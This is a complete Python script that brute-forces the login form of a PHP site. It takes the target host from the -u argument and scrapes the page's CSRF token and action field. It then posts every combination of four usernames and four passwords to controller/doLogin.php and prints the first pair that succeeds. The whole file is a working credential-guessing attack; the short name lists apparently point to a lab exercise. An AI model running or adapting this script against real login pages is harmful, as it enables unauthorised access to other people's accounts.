import getopt
import sys
import requests
from bs4 import BeautifulSoup
from requests.sessions import session

URL = ''
USERNAME_LIST = ['felix', 'jose', 'budi', 'ani']
PASSWORD_LIST = ['felix', 'jose', 'budi', 'ani']
session = requests.Session()
COMBINATION = []


def create_combination(csrf_token, action):
    for username in USERNAME_LIST:
        for password in PASSWORD_LIST:
            COMBINATION.append({
                "username": username,
                "password": password,
                "csrf_token": csrf_token,
                "action": action
            })


def bruteforce_login():
    login_url = URL+"login.php"
    auth_url = URL+"controller/doLogin.php"

    response = session.get(login_url)
    soup = BeautifulSoup(response.text, "html.parser")
    action = soup.find("input", {"name": "action"}).get("value")
    csrf_token = soup.find("input", {"name": "CSRF_TOKEN"}).get("value")

    # print(csrf_token)
    # print(action)

    create_combination(csrf_token, action)

    for data in COMBINATION:
        login_response = session.post(auth_url, data)

        if login_response.url != login_url:
            print(data)
            print("success login")
            break


def main():
    global URL

    try:
        args, _ = getopt.getopt(sys.argv[1:], "u:")
    except:
        print("failed")
        sys.exit(0)

    for key, value in args:
        if key == "-u":
            URL = "http://"+value+"/"

    if URL:
        bruteforce_login()


if __name__ == "__main__":
    main()
